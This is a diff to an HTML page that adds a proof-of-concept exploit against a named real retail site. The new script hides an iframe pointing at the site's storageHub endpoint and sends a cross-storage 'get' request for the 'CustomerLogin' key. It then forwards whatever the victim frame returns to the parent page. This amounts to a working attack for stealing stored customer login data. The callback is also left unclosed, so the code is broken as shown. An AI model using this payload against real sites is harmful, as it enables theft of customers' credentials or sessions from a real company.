@@ -3,20 +3,36 @@
   <body>
     <script>
       // wait until the parent finishes loading the target iframe
-     function tryPostMessage() {
-      try {
-        console.log("Sending message to parent...");
-        window.parent.postMessage("trigger", "*");
-      } catch (e) {
-        console.error("Failed to send postMessage", e);
-        }
-      }
+      // Step 1: Create a new iframe pointing to vulnerable storageHub
+      const victim = document.createElement("iframe");
+      victim.src = "https://newegg.com/api/storageHub"; // Replace with actual vulnerable iframe URL
+      victim.style.display = "none";
 
-      setTimeout(tryPostMessage, 1000); // try after 1 sec
+      // Step 2: Append it to this sandboxed iframe
+      document.body.appendChild(victim);
 
+      // Step 3: Wait a bit and send a postMessage
+      setTimeout(() => {
+        const payload = JSON.stringify({
+          id: "999",
+          action: "cross-storage:get",
+          params: { key: "CustomerLogin" }
+        });
+
+        victim.contentWindow.postMessage(payload, "*");
+        console.log("Sent payload to victim iframe");
+
+        // Step 4: Listen for response from storageHub
+        window.addEventListener("message", (event) => {
+          console.log("Sandboxed iframe received response from victim:", event.origin, event.data);
+
+          // Optionally forward response to main parent page
+          window.parent.postMessage("Victim said: " + event.data, "*");
+        });
     </script>
   </body>
 </html>
+
 
 
 
